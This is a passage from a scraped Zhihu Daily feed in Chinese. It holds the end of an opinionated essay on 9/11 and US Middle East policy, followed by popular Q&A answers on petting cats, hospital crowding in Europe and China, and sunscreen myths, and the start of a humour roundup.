事件，而且全程进行报道。我是不理解一个核心党媒还要（表态）做到什么程度，才能体现出这群人口中的普世价值。<br><br>国内其它大报就没有这种顾虑，所以头版封面可以自由发挥：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-68fc74777600d77a467bb99577d7c506_b.jpg\" alt=\"\"></figure><p> <br><br>这背后能看出来，当时美国的价值标准和民主体系，在全世界的影响有多广泛，对各国的民意和政策制定又有多大的引导权，是真正的民心所向，灯塔之光。<br><br>奥巴马上台后，无论个人形象还是人设塑造，都成为美国理想主义的化身，甚至亲自到中国访问，演讲能力非凡，吸引了国内许多人的好感。<br><br>但很快，他就对中国发动一系列的反倾销和征税手段，和印度达成战略协议，打西藏和台湾牌等等。<br><br>希拉里团队则集中精力攻击中国的意识形态，利用谷歌撤出中国来打舆论战和商业战，环保和人权组织也是这时期疯狂出现，外壳被包装成各种具有迷惑性的公益幌子。<br><br>在中东，美国还通过互联网来推动颜色革命，造成了影响深远的阿拉伯之春。<br><br>从突尼斯到埃及，从叙利亚到利比亚，人们上街游行抗议，用民主自由推翻了世俗政府后，迎来的却不是文明和平，而是无休止的战乱冲突、宗教圣战和恐怖袭击。<br><br>中东有三狂，萨姆，拉登，卡扎王。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-0e74da4629696ec424c6f102982e45b6_b.jpg\" alt=\"\"></figure><p> <br><br>萨达姆已经很早领了便当，紧随其后的是本·拉登。<br><br>2011 年，他藏身于巴基斯坦东北部的一处房子里，被一支海豹突击队攻破后，当场击毙，画面太过血腥，我就放不出来了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-06176809a6e629c6828e31326b082341_b.jpg\" alt=\"\"></figure><p> <br><br>行动结束后，奥巴马才确定是真的干掉本·拉登，他们已经等了 10 年。<br><br>本·拉登的尸体被扔到北阿拉伯海，他生前有一份遗嘱，里面留下了 2900 万美元的个人遗产，并希望继续用在全球圣战上。他的妻子为他写了一本书，就叫《本拉登传》。<br><br>卡扎菲，常年带着一副黑框墨镜，被称为「世界上最危险的人」，在本·拉登死后的几个月，他也走上归途。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0f7297ecbbb39f0e6af64188e5f55ae4_b.jpg\" alt=\"\"></figure><p> <br><br>在他死后，原本还算平稳的利比亚彻底乱了，恐怖组织在北非更加肆无忌惮。<br><br>中东三大狂人，至此成为了历史。</p>\n<p> <br><br><strong>捌 </strong><br><br>阿拉伯之春，给中东带来了一股令人胆颤的势力，那就是 ISIS，伊斯兰国。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-50922a7f81a65df3e02c251953abdaff_b.jpg\" alt=\"\"></figure><p> <br><br>它最初依附于基地组织，当本·拉登死后，开始脱离单干，在叙利亚内战中趁乱发展，最终在叙利亚拉卡建国。<br><br>2014 年，伊拉克也成为 ISIS 的后花园。<br><br>一个最诡异的现象是，作为民选出来的伊拉克亲美政府，在国家的治理水平上极其糟糕，水电经常断供，整天就是宗教内斗，以至于曾有人调侃，如果伊拉克某个地区的水电可以持续供应，那肯定是伊斯兰国的地盘。<br><br>换做伊拉克百姓，拥戴哪个政权一目了然。<br><br>伊斯兰国能迅速崛起，背后同样离不开沙特扶持。在希拉里的邮件门里面，就有提出沙特给予 ISIS 的财政和后勤支持。<br><br>美国乐享其成，看着伊斯兰国茁壮成长，毕竟它越强大，就越能打击叙利亚和伊朗，牵制住俄罗斯的力量，顺便让更多难民涌向欧洲，一石四鸟。<br><br>短短几年，伊斯兰国已经从一个普通的恐怖组织，变成了一个管辖数百万人口，版图有几十万平方公里的政教合一国家，有自己的科教文卫制度，有军队和精良装备，有监狱和刑法，有银行金融和石油产业，有最广大底层的百姓拥戴。<br><br>它比基地组织更厉害，不再利用极端宗教思想来捆绑人心，而是通过互联网来凝聚全世界的恐怖分子，不分国籍肤色，不计较背景，将恐怖主义渗透到全世界，构建全球武装网络，最终统一整个伊斯兰世界，并辐射全球。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-07e6a1adba8a30d470f4cb9ac6077ec9_b.jpg\" alt=\"\"></figure><p> <br><br>简单来说就是，伊斯兰国要与全世界为敌，它就像一个罪恶黑洞，源源不断地吞噬掉所有生机。这种理念太过极端，以至于许多背后金主都白瞎了眼，是在养虎为患，及时断供。<br><br>很快，它尝到了失败滋味，被打得节节败退。<br><br>2017 年 7 月 9 日，伊拉克政府军全面解放摩苏尔，这个过去一直被伊斯兰国占领的城市。<br><br>联合国难民署代表安吉丽娜 - 朱莉，在看到满目疮痍的摩苏尔时，发表了感慨：<br><br>「他们所遭受的创伤是空前的，他们独自在这里几乎没有什么支持，他们徒手重建自己的家园。废墟下有尸体，你可以闻到尸体的气味，他们的家人却无法把他们搬出来。这里的民众失去了一切，他们却很高兴，尽管一无所有，但他们自由了。」</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-27553ecff4942d642139ff0932d7d825_b.jpg\" alt=\"\"></figure><p> <br><br>非常感人的讲话，不过我们可以追本溯源，回顾一下摩苏尔为什么会沦陷，伊拉克百姓为什么会一无所有，只剩下了自由。<br><br>美国先是指责伊拉克有大规模杀伤性武器，然后发动伊拉克战争，推翻萨达姆政权，扶持民主政府，并驻扎了大量军队，却没有拿出任何资金帮助伊拉克重建家园。<br><br>然后又通过颜色革命，在中东搞阿拉伯之春，导致叙利亚局势动荡，伊斯兰国趁机崛起，并占领伊拉克和叙利亚的许多城市，其中就包括摩苏尔。<br><br>现在，由于美国的人道主义拯救，摩苏尔的人民终于解放了，这就是整个事件的完整过程。<br><br>所以再看回朱莉的这段话，你可以说她虚伪，可以说她被蒙在鼓里，但这就是整个西方舆论下的欧美百姓，他们最真实的想法。<br><br>从 2003 年至今，美军在伊拉克大使馆驻扎了 1.5 万军人，伊拉克也始终没有成为中东的民主样板国家，混乱动荡持续弥漫。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-38233361d415f9a62c2959f07eb3eefc_b.jpg\" alt=\"\"></figure><p> <br><br>所以即使伊斯兰国覆灭了，仍然有第二个伊斯兰国出现，因为贫穷和落后才是恐怖主义的生存土壤，是看不到任何希望的愤怒反抗，是炮弹和枪支威胁下的绝望反扑，也是极端保守和世俗文明的矛盾冲突。<br><br>一方的恐怖分子，就是另一方眼中的自由战士。<br><br>美国的阿富汗改造计划同样失败，国家政令不出首都，广大地区仍然是塔利班的天下。<br><br>今年 5 月，美军终于从阿富汗撤军，结束了持续 19 年的阿富汗战争。<br><br>紧接着，塔利班卷土重来，占领了阿富汗北部的两个省份首府，军营里的士兵成建制投降，非常配合。目前，塔利班已经控制了 85%的国土，上演一场农村包围城市的戏码，上位指日可待。<br><br>塔利班发言人称，不允许任何人利用阿富汗攻击中国，并欢迎中国参与阿富汗的重建、投资与发展。<br><br>这句话我们静观其变就行，什么时候塔利班能做出实际行动，赶走国内的东突分子，并且全面禁毒，稳定政治局势，什么时候我们再谈投资与合作。<br><br>对于伊朗，美国目前束手无策，只能试着重返伊核协议，做个样子。<br><br>当初美国人做的最后悔的事，大概就是在 70 年代执行的所谓人权主义运动，成功将最坚定的盟友巴列维王朝，让伊朗人民推翻，之后迎来了伊斯兰政权，从世俗化走进宗教主义。<br><br>如今伊朗、伊拉克和叙利亚，被统称为什叶派之弧。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b7e2a3e6a5ab5be8b7c7a23ef36001dc_b.jpg\" alt=\"\"></figure><p> <br><br>在奥巴马任期内，他做出了许多决策，看似高大上，却无法解决任何问题，场面一度很尴尬。<br><br>比如医保改革，没有下文；金融改革，最终喂饱华尔街，国债规模翻了一倍；想从伊拉克撤兵，结果大量增兵；快要谈成 TPP 协议时，自己要退休了。<br><br>奥巴马执政八年的成果，让美国人民选择了特朗普。</p>\n<p> <br><br><strong>玖</strong><br><br>伦理实体的分裂，是悲剧冲突产生的根源，黑格尔的悲剧理论同样适用于 911 事件。<br><br>建立在山巅之上的美式民主文化，凭借信念和钢铁打造出雄伟的双子塔，它引领着纽约人民闯过震荡时期，就像扮演英雄归来的角色；<br><br>建立在黑金沙漠上的伊斯兰文化，通过《古兰经》的一代代诠释和传承，在文明冲突中变得保守和激进，分化出极端瓦哈比主义，在全球展开圣战。<br><br>一个位于世界岛中心，一个位于太平洋远端，两者本没有任何交集，可矛盾总会戏剧性展开。<br><br>双子塔就像一把达摩克利斯之剑，高耸入云，它能俯瞰天际，散发令人惊惧的压迫感，对这个世界的经济脉络了如指掌。<br><br>它代表着人道主义的光芒，尽力维护个体尊严，却在租售面积上做到极限，能同时容纳无数躯壳在里面办公，被 240 根密不透风的钢柱包围起来。<br><br>它将伊斯兰风格和美式商业结合起来，这是文化包容、兼容并蓄的体现，却被另一个更保守、更反权威的国度，解读为对伊斯兰教的亵渎，他们不需要自由女神像的任何借鉴创新。<br><br>最终，双子塔被摧毁，和它一起倒塌的，是美国引以为傲的普世价值。<br><br>傲慢，是一种得不到支持的尊严，因为它永远不会从历史中吸取到任何教训。<br><br>我们引以为戒。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-96525afc649be8a738d683317dfa443c_b.gif\" alt=\"\"></figure><p> <br><br><strong>END</strong><br><br><strong>首发在公号上：智先生</strong><br><br>部分资料参考：<br><br>纪录片：《脆弱的变化》《世贸中心》劳伦斯·赖特：《末日巨塔》[美] 罗伯特·格鲁丁：《设计与真理》艾哈迈德·拉希德：《塔利班 : 宗教极端主义在阿富汗及其周边地区》洛蕾塔.拿塔里奥尼：《这才是伊斯兰国》纳伊瓦·本·拉登：《本·拉登传》FEMA：《世界贸易中心建筑性能研究》《Screw Loose Change》博客大众机械杂志社：《9/11 谎言大揭穿》张家栋：《世界恐怖主义的主要特征与发展趋势》李军：《恐怖主义与主要大国的反恐战略研究》梁云明：《世贸中心大楼倒塌的分析和对高楼拆除爆破的思考》樊杰辉：《论当代恐怖主义的根源》王玉鹏：《新美国世纪计划与美国对伊拉克战争的决策》王献枢：《伊拉克战争的非法性》盛睿：《后本拉登时代的基地组织研究》李新：《纽约世贸大厦坍塌的原因及应吸取的教训》李湘洲：《美国纽约世贸大厦倒塌原因分析与建造超高层建筑的思考》Dr.Peter kuhn：《从世贸大厦倒塌看钢结构防火的重要意义》殷之光：《伊斯兰的瓦哈比化:ISIS 的不平等根源与世界秩序危机》倪真：《瓦哈比主义与沙特王权》邓浩：《伊斯兰瓦哈比教派与中亚政局》文静：《海湾战争期间美国的心理战研究》丁隆：《逊尼派 VS 什叶派:旧恨新仇》李明波：《逊尼派与什叶派延续千年的冲突》赵明昊：《美国在阿富汗的“国家建设”缘何失败》王凤：《阿富汗塔利班重组及其挑战》王晋：《伊斯兰国与恐怖主义的变形》田文林：《伊斯兰国兴起与美国的中东战略》山崎实：《纽约世贸中心双塔设计者的自白——我的建筑生活》金磊：《美国世贸中心倒塌及其启示》山崎实：《曾经耸立的双塔——纽约世界贸易中心》Tom Grimwood：《The Rhetoric of Demonic Repetition:The Two Deaths of Osama Bin Laden and Other Stories》Langman Peter：《Osama bin Laden: Humble megalomaniac》Wani Zahoor Ahmad：《Afghanistan’s Neo-Taliban Puzzle》Raj Verma：《US–Taliban peace deal and regional powers as potential spoilers: Iran as a case study》</p>\n<div><a href=\"https://zhuanlan.zhihu.com/p/389190607\">阅读原文</a></div>\n</div>\n</div>\n</div>","link":"https://daily.zhihu.com/story/9738091"},{"title":"为什么会有人摸猫人爽猫也爽这种双赢的事？这种关系的条件是什么？怎样复制它？","date":"2021-07-14 23:06:35","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/0ce64377f59bba8c11e09168274f86c1_l.jpg?source=8673f162\"><span>赵泠，</span><span>遗迹是曾经讴歌繁荣的生命留下的缺页的梦。</span>\n<a href=\"https://www.zhihu.com/question/471853909/answer/1994940324\" hidden>阅读原文</a>\n</div>\n<div>\n<p>一方面是因为人和猫的生物学特性：</p>\n<ul>\n<li>人、狒狒等群居灵长类动物长期存在<strong>给同伴梳毛</strong>的行为，突变与自然选择形成了相关的回路，梳毛时手上的触感、体温、对方的反应会触发大脑的<strong>奖励系统</strong>，释放多巴胺与血清素，降低消极情绪。</li>\n<li>猫将约 8% 的休息时间用于梳理自己的毛，并会和熟悉的个体互相舔。人对猫的抚摸可以被猫理解为善意互动，并触发其咕噜声和露出肚皮的行为。</li>\n<li>猫的手感和被摸时的反应，与群居灵长类动物的相关回路相适应。猫被摸时的模样（尤其是眼睛）会引起一部分人的大脑释放<strong>催产素</strong>，让人感到其陪伴。</li>\n<li>这里的部分原因是猫的眼睛与脸的比例相对较大，还有比较圆的头、比较短的四肢，接近灵长类幼体的<strong>幼态</strong>。</li>\n<li>因此，一部分人和一部分非人灵长类是喜欢摸猫的。</li>\n</ul>\n<p><strong>人与猫的互利共生</strong>并不只建立在“陪伴”的层面。历史上，猫在捕鼠方面发挥了很大的作用。</p>\n<p>弓形虫可能通过改变宿主的部分神经接线改变宿主对猫的态度。目前还不清楚这在灵长类对猫的态度中起了多大的作用。</p>\n<p>沙特阿拉伯境内有<strong>狒狒和流浪狗、流浪猫共居的群落</strong>，这群落中的狗会攻击外来的狗以保护狒狒。有些狗在幼年时就被狒狒带回群落里养大。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8c7679eabb4884ef2af6fc04be815b27_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-b7d5b3af3efd759bc8ed808e889dd08d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>宠物：<strong>上述狒狒不但会给猫狗梳毛、分享一些食物，有时还会与猫交配</strong>。</p>\n<p>即使不在非人生物间谈“陪伴”，狒狒与猫交配还是可以视为<strong>玩赏取乐</strong>。</p>\n<ul><li>这件事教育我们，人类对猫娘的喜好或许可以从远古祖先那里找到起源。</li></ul>\n<p>人类拿来研究动物认知能力的实验动物，往往也被人类教会了养宠物——有时，人类没有主动教育它们，但它们习得了这个模因。例如大猩猩 Koko 有几只宠物猫，猩猩 Tonda 有一只宠物猫，大象 Tarra 有一条宠物狗，它们会给宠物喂食、进行抚摸等互动，乃至将宠物当做幼年同类来抚养。</p>\n<ul><li>Koko 可以用手语对研究人员表达自己对猫的喜爱（具体而言，1983 年圣诞节的时候，Koko 向研究人员要一只猫，并对填充玩具猫感到不满。1984 年，研究人员允许 Koko 从一窝被人类遗弃的小猫中选择一只。Koko 用人类语言给小猫命名，照顾小猫，并在小猫被汽车意外撞死后表达了自己的悲伤。后来人类又给了 Koko 更多的小猫）。</li></ul>\n<p>另一方面是因为你太年轻太单纯，会对这种程度的事大惊小怪。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-cedaa670ea0e29a9e4e042f1fc9dfb63_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这不限于“双赢”，生殖器官发育了一部分（不要求完全）的人就能自己“凭空”产生快乐呢。</p>\n<p>“谁是代价”的思维方式只适用于零和博弈，地球上到处都是<strong>互利共生</strong>。</p>\n<p>不过，只要你乐意，要找“代价”是很容易找到的：</p>\n<ul>\n<li>摸猫需要移动身体，消耗了少许体力；</li>\n<li>自己养猫、去找养猫的人并撸其猫、找个野猫来撸都需要花费时间与精力；</li>\n<li>摸猫有概率传染病原体，还有概率被猫攻击，一些人还会对猫的分泌物过敏，这是承担风险；</li>\n<li>摸猫花费的时间是你有限的寿命的一部分；</li>\n</ul>\n<p>诸如此类。</p>\n<p>撸炮的情况也是大同小异的。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7a58dc80ff8d58a178d93d5ba564f889_720w.jpg?source=8673f162\" alt=\"\"></figure><p>互利共生的基本条件是“<strong>和对方生活在一起带来的好处超过害处</strong>”，这主要取决于双方的生理特性，而不是非要有所谓“意愿”。将非人生物的行为拟人化，对宠物主人来说可能是合理的，但对科学地理解共生和驯化并无好处。</p>\n<ul>\n<li>人和消化道微生物的互利共生的历史与人类种的历史一样长，微生物根本就没有“意愿”可言。</li>\n<li>猫不能通过镜子测试（猫对镜子的反应包括“当做另一只猫”“当做奇怪对象”“熟视无睹”“用镜子观察周围”，但不能有效识别自己的镜像），很可能没有自我意识。</li>\n</ul>\n<p>生理特性的磨合需要<strong>时间</strong>。影响动物行为的基因可以在<strong>人工选择</strong>下很快被筛选出来。人饲养猫的历史约 9500 年，驯化程度是“半驯化”，和猫的关系还是不如和狗来得亲密。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/471853909\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738082"},{"title":"为什么国外的医院里没多少人，而国内的医院都是大把大把的病人？","date":"2021-07-14 23:06:31","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-8d4b733bc79eed4466151f2b22244cb2_l.jpg?source=8673f162\"><span>浩浩耗，</span><span>我有屠龙之术，欲翻流云起舞；我有苍茫之志，欲煎七海成田；</span>\n<a href=\"https://www.zhihu.com/question/465695535/answer/1997386583\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我只说下欧洲的情况，其它地方的我不知道</p>\n<p>我在留学的时候，还是去过几次医院，其实不是说病人少，而是相对而言，看起来确实人要比国内的医院少很多。这背后主要有两个原因：</p>\n<p><strong>第一呢，在于医疗服务的覆盖比</strong>。因为欧洲也有一套完善的社区 / 家庭医生服务体系，基本上一个片区的居民都会有固定的家庭医生，所以一般小毛病什么的，不用去医院，直接在家，打电话问问医生，或者医生上门来看看也就解决了。而我们国家目前这一体系还刚刚开始起步，所以现在基本上还是以一发现问题，不管大小，都喜欢往医院跑为普遍现象。再加上大医院崇拜~别的不说，就拿成都的华西医院来说，我有一些医生朋友经常抱怨说，上个门诊天天看的都是不痛不痒的小病，真正需要看病的，号都挂不上。</p>\n<p>另外呢，基于人口基数，确实我国平坦下来的医疗服务覆盖度就很低了。这也是，一有问题就爱往医院跑得根本原因。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-c64cb852fda6cbef472ebf1f6b1a7974_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>第二呢，在于就医预约系统的完善和普及</strong></p>\n<p>这就是我一开始说的，不是说病人少，只不过每天看病的人都是提前就预约好的，所以一般你去医院会发现，虽然基本没什么人，但其实医生一直都在看病的。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-5f909f9d7e5882f015b4d2d61f4acdd9_720w.jpg?source=8673f162\" alt=\"\"></figure><p>但你要说国外的医疗体系就是全方位碾压国内，那也不是。就我个人的经历，我就觉得有很多值得诟病的地方。<strong>比如，对于突发性疾病或者事故，这种医疗体系就很弱智，因为这部分人不可能提前预约，所以这部分病人基本上是很难马上就获得及时治疗的</strong>。</p>\n<p>我之前有一次被猫抓了，想着去打个狂犬疫苗，就去看过急诊，那相对其它地方，急诊等待区那可是人满为患，光那次就有好几个一身血的人（可能喝醉了摔伤的），也没有人包扎就在哪儿坐着干等.....</p>\n<p>另外一点呢，就是欧洲这种医疗体系，<strong>虽然就医体验很好，但其实内部效率很低</strong>。因为不管是那个国家，医疗资源都肯定是稀缺资源，加上国外的公共保险系统，生病都是保险公司买单，所以没人会想着看病省钱，但凡能住院都想住院。但实际医疗资源就匹配不上。这就导致，医生一般都会尽可能的劝退，能不用药的就叫你回去喝水，不到万不得已绝对不会让你住院。</p>\n<p>我在瑞典读书时，有个朋友就遇到过类似情况，一个咳嗽咳了很久，去了几次医院，医生就不给开药，就让他回去喝水......最后硬生生拖成肺炎住院。</p>\n<p>最后她告诉我，一进住院部，直接就是贵宾级待遇，好手好脚的，走哪儿都有专门的护士用轮椅推你。每天早上会有专人来问你今天一天的饭加甜点吃什么，每顿饭都有 3-5 个套餐供选择，病情允许还有下午茶和蛋糕吃.....而且，全部保险公司保险....</p>\n<p>你说这能随便让你住院么......</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/465695535\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738093"},{"title":"关于防晒有哪些智商税？","date":"2021-07-14 23:06:23","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-5ec2a04d747dff9845713ffe0964954b_l.jpg?source=8673f162\"><span>胖博士，</span><span>懂你皮肤问题的清华胖师兄</span>\n<a href=\"https://www.zhihu.com/question/468821287/answer/1995724278\" hidden>阅读原文</a>\n</div>\n<div>\n<p>掰掰手指，防晒的智商税可真不少。其中有 SPF 越高越好，防晒喷雾比防晒霜好，防晒要卸妆，物理防晒比化学防晒好，每两个小时要补涂防晒霜。这篇文章看完，你就不会成为一颗绿油油的韭菜了。</p>\n<p><strong>一味追求高 SPF 值</strong></p>\n<p>在新加坡读博士期间，假期我们很喜欢去东南亚海岛玩。去热带岛屿旅游，防晒自然是少不了的。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-4a132cf89bd1e2ae2d74ebcd6321199b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>东南亚海岛游，防晒少不了</figcaption></figure><p>那时候还在读书，没入行美妆，对这些知识也不懂。想着热带海岛紫外线特别强烈，得带高 SPF 的防晒霜。</p>\n<p>跑去屈臣氏看半天，最后挑选了某品牌旗下的 SPF130 防晒霜。那时候，天真的我以为 SPF130 防晒霜的防护能力是 SPF30 的四倍多。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d7cb652840f83967809db9357098153c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>等我入行化妆品行业，才知道 SPF 值和防晒能力并不是线性相关。</p>\n<p>防晒效率=(SPF-1)/SPF</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-6714feba19559775370b3ecb8c55abc1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>防晒效率和 SPF 的关系</figcaption></figure><p>SPF50 就已经有 98%的防晒效率，而 SPF130 的防晒效率是 99.23%。提升并不明显。</p>\n<p>但是一方面，超高 SPF 意味着更多的防晒剂，更差的肤感，也许还有更贵的价格，以及营销噱头。而根据中国法规，SPF 能标注的上限是 50。</p>\n<p>如此谨慎的药监局都觉得 SPF50 足够了，还要啥超高 SPF 值？</p>\n<p><strong>防晒喷雾比防晒霜好</strong></p>\n<p>记得刚入行研究化妆品成分的时候（那时我还在妮维雅），没啥经验。一个供应商跑来告诉我，他们有个超牛的包裹防晒霜，放到喷雾配方里，只要很少的量，就能实现超高 SPF，肤感还非常好。</p>\n<p>很傻很天真的我把这个配方送到德国去做测试。宣称的 SPF30，最后测出来只有不到 10。</p>\n<p>被鄙视了一顿之后，我陷入了深深地沉思，为什么防晒喷雾会变成智商税？</p>\n<p>在观察了消费者使用习惯以后，我知道了答案。原来大家喷防晒喷雾的时候，对喷多少并没有概念。有时候甚至是胡乱喷一通。于是皮肤上只有很少一层薄薄的防晒。甚至因为喷雾的液滴太少，而无法成膜。</p>\n<p>涂防晒霜的时候，大家已经受过很好的教育，涂的量足。加上涂抹也会促进成膜效果，于是能带来足够的防护能力。</p>\n<p>喷雾还有个问题就是有吸入风险。那么小的雾化颗粒容易进入呼吸道，里面的成分被快速吸收，带来意想不到的后遗症。</p>\n<p><strong>防晒要卸妆</strong></p>\n<p>这又是一个在网上到处泛滥的伪科学。我怀疑这是卸妆油 / 卸妆水品牌贩卖焦虑，让大家多买卸妆产品的圈套。</p>\n<p>很多美妆博主一知半解的说“你看，防晒霜里面有成膜剂，都成一层膜了，不卸妆怎么洗的下来？”</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-36d77cb0685e79bac7979b134957ae9a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>成膜剂让防晒霜更均匀贴合皮肤表面</figcaption></figure><p>殊不知，成膜剂可以是水性的，也可以是油性的，还可能只是塑料微球而已。</p>\n<p>其实除了极少数超级防水的防晒霜，大部分防晒霜的防水效果很一般，或者干脆没有。下图对市售防晒霜防水效果的测试也说明这个结论。很多防晒霜成膜之后，只用少量的水，就可以破坏成膜结构。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-786c98b51b21f4e88e0017b2afb8d581_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这是因为防晒霜里面的防晒剂大部分都是油脂。防晒霜里面有大量的乳化剂。遇水之后，会再次乳化配方，于是就很容易洗下来。</p>\n<p>除非是非常强力的成膜剂，能让防晒霜真正实现防水功能。否则普通的防晒霜直接用洗面奶就可以洗掉。</p>\n<p><strong>物理防晒比化学防晒好</strong></p>\n<p>很多朋友谈化学色变。甚至有了“我们恨化学”的口号。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-604448efcb291de8984ab7ed7af9be17_720w.jpg?source=8673f162\" alt=\"\"><figcaption>我们恨化学的广告</figcaption></figure><p>于是化学防晒剂也纷纷中招。大家纷纷觉得它们不安全，而使用看起来安全的物理防晒剂。</p>\n<p>目前的主流物理防晒剂就两种，二氧化钛和氧化锌。然而它们都有缺点。</p>\n<p>二氧化钛的工艺成熟，成本低，通过表面处理和粒径控制，可以最大限度避免泛白。但是它的紫外线吸收光谱窄。尤其是缺乏 UVA 防护能力。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-17b2bf0c6785f6dc4c4295721dc7ce66_720w.jpg?source=8673f162\" alt=\"\"><figcaption>二氧化钛和氧化锌的吸收波长</figcaption></figure><p>氧化锌虽然吸收光谱宽，对 UVA 和 UVB 都有很好的防护效果。但是它泛白严重，而且氧化锌有一定的环境毒性。所以氧化锌的使用有很多限制。</p>\n<p>纯物理防晒，要么白的像涂料，要么 UVA 防护效果不好。所以市面上大部分防晒产品还是会选择化学防晒剂。</p>\n<p>至于化学防晒剂的安全性问题，欧盟相关法规有非常严格的审查和规定。只要在限量范围内，就不会有问题。事实上，除了极少数化学防晒剂，即使对于孕妇和儿童，很多化学防晒剂也是安全的。</p>\n<p><strong>防晒霜一定要每两个小时要补涂一次</strong></p>\n<p>这又是一个贩卖焦虑的洗脑。美妆博主的逻辑是“防晒剂不稳定，所以每两个小时要补一次”</p>\n<p>如果防晒剂真的这么不稳定，那么开发防晒剂的厂商可以回家喝西北风了。防晒剂的不稳定性更多是和普通成分相比。实际上，为了让配方更稳定，防晒霜里面会加入光稳定剂让防晒剂更不容易降解。</p>\n<p>真正容易破坏防晒霜效果的还是水和物理摩擦。</p>\n<p>当有外力破坏的时候（比如抓痒，摩擦）防晒霜里的成膜剂有可能过度拉伸破坏。防晒霜不均匀，降低对紫外线的防护能力。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-21fc9689db341e70ed97d1ba5c740aaa_720w.jpg?source=8673f162\" alt=\"\"><figcaption>被破坏的防晒霜成膜剂</figcaption></figure><p>水的破坏也是如此。当水破坏防晒剂，或者让防晒霜再次乳化的时候，防晒效果也就降低了。</p>\n<p>所以如果呆在室内，或者皮肤上没有水和物理摩擦破坏防晒霜的成膜，不需要两个小时补涂一次防晒霜。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/468821287\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738077"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-07-14 23:06:20","description":"\n<div>\n<h2>人在医院能无知到何种程度？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>认真你就输了，</span><span>没啥好说的</span>\n<a href=\"https://www.zhihu.com/question/305685211/answer/571947516\" hidden>阅读原文</a>\n</div>\n<div>\n<p>病人家属说，你们住院费用那么贵，饭后竟然还不送果盘？！</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/305685211\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>受疫情影响，东京奥运乒乓球比赛不许手触球台或吹球，这对球员影响大吗？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/1f5ec9e3f_l.jpg?source=8673f162\"><span>厌谷，</span><span>学习中的电商人</span>\n<a href=\"https://www.zhihu.com/question/472117398/answer/1997143408\" hidden>阅读原文</a>\n</div>\n<div>\n<p>不懂就问..</p>\n<p>为啥要吹球？</p>\n<p> </p>\n<blockquote><div>评论区</div></blockquote>\n<blockquote><div>\n<a href=\"https://zhuanlan.zhihu.com/people/a-jia-ge-zhu\" target=\"_blank\" rel=\"noopener noreferrer\">@阿贾哥丶</a> ：你扔纸飞机之前哈气不？</div></blockquote>\n<blockquote><div>\n<a href=\"https://zhuanlan.zhihu.com/people/tom-78-87\" target=\"_blank\" rel=\"noopener noreferrer\">@Tom</a> ：可以球表面的湿度，从而影响摩擦力改变旋转速度</div></blockquote>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/472117398\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>你看过最奇怪的书是什么？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/37510c1c26e3168417c94aebc6aa5512_l.jpg?source=8673f162\"><span>徐三石，</span><span>公众号：徐三石</span>\n<a href=\"https://www.zhihu.com/question/24921291/answer/578738111\" hidden>阅读原文</a>\n</div>\n<div>\n<p>上个世纪写给 21 世纪少女的《少女生活百科》</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-acd723b7cc99fbf4d6782cff5f2efd39_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-23757a803535a91713098611eb7cdee6_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-fb494e237278b865c19a16f79eb6e41a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-a182259aa86658ac9cc964b0c7b9c093_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-df407bb48ca654c62a8f2de04e6b63a7_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a 